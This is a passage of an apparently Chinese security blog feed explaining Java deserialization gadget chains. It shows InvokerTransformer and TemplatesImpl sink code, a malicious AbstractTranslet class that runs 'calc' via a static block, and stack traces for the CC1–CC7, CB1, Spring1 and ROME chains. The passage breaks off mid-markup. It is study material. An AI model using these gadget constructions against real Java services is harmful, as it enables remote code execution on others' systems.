      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="Sink点"><a href="#Sink点" class="headerlink" title="Sink点"></a>Sink点</h1><h2 id="InvokerTransformer利用点"><a href="#InvokerTransformer利用点" class="headerlink" title="InvokerTransformer利用点"></a>InvokerTransformer利用点</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span> r = <span class="hljs-keyword">Runtime</span>.getRuntime();<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);</code></pre></div><h3 id="命令执行分析"><a href="#命令执行分析" class="headerlink" title="命令执行分析"></a>命令执行分析</h3><p>查看<code>org.apache.commons.collections.functors.InvokerTransformer#InvokerTransformer(java.lang.String, java.lang.Class[], java.lang.Object[])</code>构造方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163731953.png"> </p><p>首先创建一个<code>InvokerTransformer</code>对象，可为其提供方法名，参数类型，参数值</p><p>再查看<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>方法，方法内部获取传入对象的类，在获取指定名称的方法，在反射调用该方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201163753455.png"> </p><p><strong>可见该利用点是通过反射进行命令执行</strong></p><h2 id="TemplatesImpl利用点"><a href="#TemplatesImpl利用点" class="headerlink" title="TemplatesImpl利用点"></a>TemplatesImpl利用点</h2><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>Java的类加载是通过java.lang.ClassLoader#loadClass(java.lang.String)方法实现的，defineClass方法允许从字节数据中还原一个类，由于java.lang.ClassLoader类的defineClass方法是私有或保护的，这在一定程度上难以利用。</p><p>在TemplatesImpl类中，其内部类TransletClassLoader继承了ClassLoader并重写了loadClass和defineClass方法，该利用点就是围绕着defineClass方法传入恶意字节数据来进行类加载进而执行命令</p><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><p>Calc.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><p>test.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(Calc.class);        <span class="hljs-type">byte</span>[] code = javaClass.getBytes();        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        obj.newTransformer();    &#125;&#125;</code></pre></div><h3 id="命令执行分析-1"><a href="#命令执行分析-1" class="headerlink" title="命令执行分析"></a>命令执行分析</h3><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>方法内的newInstance()代码位置下断点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201114211358.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201112003177.png"> </p><p>进入newTransformer()方法，首先使用TransformerImpl类的有参构造方法创建一个对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201112134204.png"> </p><p>查看该构造方法，第一个参数为AbstractTranslet类的实例对象，可知getTransletInstance()方法大概为创建一个AbstractTranslet类的实例对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201114943384.png">  </p><p>进入getTransletInstance()方法，当<code>_name</code>字段为空时返回，当<code>_class</code>字段不为空时，执行<code>defineTransletClasses()</code>方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201115148208.png"> </p><p>  进入<code>defineTransletClasses()</code>方法，当<code>_bytecodes</code>字段为空时，抛异常；往下进行访问权限的校验，需要用到<code>_tfactory</code>字段，该字段为<code>private transient TransformerFactoryImpl _tfactory = null;</code>对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201115329007.png"> </p><p>在getTransletInstance()方法中，判断<code>_name</code>字段是否为空，为空则返回，在判断<code>_class</code>字段是否为空，不为空进入<code>defineTransletClasses()</code>方法，跟随调用链进入该方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201113058486.png"> </p><p>在<code>defineTransletClasses()</code>方法中，判断<code>_bytecodes</code>字段是否为空，为空则抛出异常，然后再做访问控制的校验，需要用到<code>_tfactory</code>字段</p><blockquote><p>_bytecodes字段为二维字节数组：private byte[][] _bytecodes;</p></blockquote><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201113708991.png"> </p><p>接下对传入的<code>_bytecodes</code>数据解析，调用<code>defineClass()</code>方法从字节数据中加载类，并判断该类是否实现了<code>AbstractTransletImpl</code>抽象类</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201123433614.png"> </p><p>最后来到<code>newInstance()</code>方法创建实例，<strong>可知命令执行是在创建实例对象过程中执行了静态代码块</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231201124139890.png"> </p><h3 id="恶意类构造"><a href="#恶意类构造" class="headerlink" title="恶意类构造"></a>恶意类构造</h3><p>经上面的分析，可知</p><ol><li><p>在从字节数据中加载类后会判断类的超类是否为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet抽象类，所以恶意类需要实现该抽象类。</p></li><li><p>加载到恶意类对象后会调用<code>newInsance()</code>方法创建对象，由此我们可以在恶意类内加入静态代码块或构造代码块来实现类加载时执行恶意代码。</p></li><li><p>该类最好不属于任何包。</p></li></ol><p>实例</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;        <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span>&#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><h3 id="构造字节码数据"><a href="#构造字节码数据" class="headerlink" title="构造字节码数据"></a>构造字节码数据</h3><div class="code-wrapper"><pre><code class="hljs abnf">JavaClass javaClass <span class="hljs-operator">=</span> Repository.lookupClass(Calc.class)<span class="hljs-comment">;</span>byte[] code <span class="hljs-operator">=</span> javaClass.getBytes()<span class="hljs-comment">;</span></code></pre></div><h1 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h1><p>CC1-CC7反序列化链就是利用了上述两个sink点，与不同的readObject入口拼接来达到命令执行效果</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/d1e330174cca50820a42e99a8b521c44.png"></p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span>:<span class="hljs-number">347</span>, Runtime (java.lang)<span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">497</span>, Method (java.lang.reflect)<span class="hljs-meta"> [2]</span><span class="hljs-attribute">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)<span class="hljs-attribute">transform</span>:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)<span class="hljs-attribute">checkSetValue</span>:<span class="hljs-number">204</span>, TransformedMap (org.apache.commons.collections.map)<span class="hljs-attribute">setValue</span>:<span class="hljs-number">192</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)<span class="hljs-attribute">readObject</span>:<span class="hljs-number">451</span>, AnnotationInvocationHandler (sun.reflect.annotation)</code></pre></div><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">exec:</span><span class="hljs-number">347</span>, Runtime (java.lang)<span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">497</span>, Method (java.lang.reflect)<span class="hljs-symbol">transform:</span><span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)<span class="hljs-symbol">transform:</span><span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)<span class="hljs-symbol">get:</span><span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)<span class="hljs-symbol">invoke:</span><span class="hljs-number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)<span class="hljs-symbol">entrySet:</span><span class="hljs-number">-1</span>, $Proxy0 (<span class="hljs-keyword">com</span>.sun.proxy)<span class="hljs-symbol">readObject:</span><span class="hljs-number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</code></pre></div><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">newInstance:</span><span class="hljs-number">396</span>, Class (java.lang)<span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">455</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect) [<span class="hljs-number">2</span>]<span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">497</span>, Method (java.lang.reflect)<span class="hljs-symbol">transform:</span><span class="hljs-number">129</span>, InvokerTransformer (org.apache.commons.collections4.functors)<span class="hljs-symbol">compare:</span><span class="hljs-number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)<span class="hljs-symbol">siftDownUsingComparator:</span><span class="hljs-number">721</span>, PriorityQueue (java.util)<span class="hljs-symbol">siftDown:</span><span class="hljs-number">687</span>, PriorityQueue (java.util)<span class="hljs-symbol">heapify:</span><span class="hljs-number">736</span>, PriorityQueue (java.util)<span class="hljs-symbol">readObject:</span><span class="hljs-number">795</span>, PriorityQueue (java.util)</code></pre></div><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>有多种组装方式</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">newInstance:</span><span class="hljs-number">396</span>, Class (java.lang)<span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">455</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)&lt;init&gt;:<span class="hljs-number">64</span>, TrAXFilter (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<span class="hljs-symbol">newInstance0:</span><span class="hljs-number">-1</span>, NativeConstructorAccessorImpl (sun.reflect)<span class="hljs-symbol">newInstance:</span><span class="hljs-number">62</span>, NativeConstructorAccessorImpl (sun.reflect)<span class="hljs-symbol">newInstance:</span><span class="hljs-number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)<span class="hljs-symbol">newInstance:</span><span class="hljs-number">422</span>, Constructor (java.lang.reflect)<span class="hljs-symbol">transform:</span><span class="hljs-number">106</span>, InstantiateTransformer (org.apache.commons.collections.functors)<span class="hljs-symbol">transform:</span><span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)<span class="hljs-symbol">get:</span><span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)<span class="hljs-symbol">invoke:</span><span class="hljs-number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)<span class="hljs-symbol">entrySet:</span><span class="hljs-number">-1</span>, $Proxy0 (<span class="hljs-keyword">com</span>.sun.proxy)<span class="hljs-symbol">readObject:</span><span class="hljs-number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</code></pre></div><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">newInstance:</span><span class="hljs-number">396</span>, Class (java.lang)<span class="hljs-symbol">getTransletInstance:</span><span class="hljs-number">455</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<span class="hljs-symbol">newTransformer:</span><span class="hljs-number">486</span>, TemplatesImpl (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)&lt;init&gt;:<span class="hljs-number">64</span>, TrAXFilter (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xalan.internal.xsltc.trax)<span class="hljs-symbol">newInstance0:</span><span class="hljs-number">-1</span>, NativeConstructorAccessorImpl (sun.reflect)<span class="hljs-symbol">newInstance:</span><span class="hljs-number">62</span>, NativeConstructorAccessorImpl (sun.reflect)<span class="hljs-symbol">newInstance:</span><span class="hljs-number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)<span class="hljs-symbol">newInstance:</span><span class="hljs-number">422</span>, Constructor (java.lang.reflect)<span class="hljs-symbol">transform:</span><span class="hljs-number">116</span>, InstantiateTransformer (org.apache.commons.collections4.functors)<span class="hljs-symbol">transform:</span><span class="hljs-number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)<span class="hljs-symbol">transform:</span><span class="hljs-number">112</span>, ChainedTransformer (org.apache.commons.collections4.functors)<span class="hljs-symbol">compare:</span><span class="hljs-number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)<span class="hljs-symbol">siftUpUsingComparator:</span><span class="hljs-number">669</span>, PriorityQueue (java.util)<span class="hljs-symbol">siftUp:</span><span class="hljs-number">645</span>, PriorityQueue (java.util)<span class="hljs-symbol">offer:</span><span class="hljs-number">344</span>, PriorityQueue (java.util)<span class="hljs-symbol">add:</span><span class="hljs-number">321</span>, PriorityQueue (java.util)</code></pre></div><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span>:<span class="hljs-number">347</span>, Runtime (java.lang)<span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">497</span>, Method (java.lang.reflect)<span class="hljs-attribute">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)<span class="hljs-attribute">transform</span>:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)<span class="hljs-attribute">get</span>:<span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)<span class="hljs-attribute">getValue</span>:<span class="hljs-number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<span class="hljs-attribute">toString</span>:<span class="hljs-number">132</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<span class="hljs-attribute">readObject</span>:<span class="hljs-number">86</span>, BadAttributeValueExpException (javax.management)</code></pre></div><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>hashMap.hash()–&gt;TiedMapEntry.hashCode()</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span>:<span class="hljs-number">347</span>, Runtime (java.lang)<span class="hljs-attribute">invoke0</span>:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-attribute">invoke</span>:<span class="hljs-number">497</span>, Method (java.lang.reflect)<span class="hljs-attribute">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)<span class="hljs-attribute">transform</span>:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)<span class="hljs-attribute">get</span>:<span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)<span class="hljs-attribute">getValue</span>:<span class="hljs-number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<span class="hljs-attribute">hashCode</span>:<span class="hljs-number">121</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)<span class="hljs-attribute">hash</span>:<span class="hljs-number">338</span>, HashMap (java.util)<span class="hljs-attribute">readObject</span>:<span class="hljs-number">1397</span>, HashMap (java.util)</code></pre></div><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>Hashtable.reconstitutionPut()–&gt;AbstractMapDecorator.equals()</p><div class="code-wrapper"><pre><code class="hljs oxygene">exec:<span class="hljs-number">347</span>, Runtime (java.lang)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, <span class="hljs-keyword">Method</span> <span class="hljs-params">(java.lang.reflect)</span><span class="hljs-title function_">transform</span>:<span class="hljs-number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)transform:<span class="hljs-number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)get:<span class="hljs-number">158</span>, LazyMap (org.apache.commons.collections.map)<span class="hljs-keyword">equals</span>:<span class="hljs-number">472</span>, AbstractMap (java.util)<span class="hljs-keyword">equals</span>:<span class="hljs-number">130</span>, AbstractMapDecorator (org.apache.commons.collections.map)reconstitutionPut:<span class="hljs-number">1221</span>, Hashtable (java.util)readObject:<span class="hljs-number">1195</span>, Hashtable (java.util)</code></pre></div><h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect) <span class="hljs-selector-attr">[2]</span>invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invokeMethod:<span class="hljs-number">2116</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getSimpleProperty:<span class="hljs-number">1267</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getNestedProperty:<span class="hljs-number">808</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getProperty:<span class="hljs-number">884</span>, PropertyUtilsBean (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)getProperty:<span class="hljs-number">464</span>, PropertyUtils (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)compare:<span class="hljs-number">163</span>, BeanComparator (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span>.beanutils)siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)readObject:<span class="hljs-number">795</span>, PriorityQueue (java.util)</code></pre></div><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">442</span>, Class (java.lang)getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invoke:<span class="hljs-number">307</span>, AutowireUtils<span class="hljs-variable">$ObjectFactoryDelegatingInvocationHandler</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.beans</span><span class="hljs-selector-class">.factory</span>.support)newTransformer:-<span class="hljs-number">1</span>, <span class="hljs-variable">$Proxy10</span> (com<span class="hljs-selector-class">.sun</span>.proxy)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invokeMethod:<span class="hljs-number">202</span>, ReflectionUtils (org<span class="hljs-selector-class">.springframework</span>.util)invokeMethod:<span class="hljs-number">187</span>, ReflectionUtils (org<span class="hljs-selector-class">.springframework</span>.util)readObject:<span class="hljs-number">404</span>, SerializableTypeWrapper<span class="hljs-variable">$MethodInvokeTypeProvider</span> (org<span class="hljs-selector-class">.springframework</span>.core)</code></pre></div><h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><p>HashMap.hash()–&gt;ObjectBean.hashCode()</p><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span 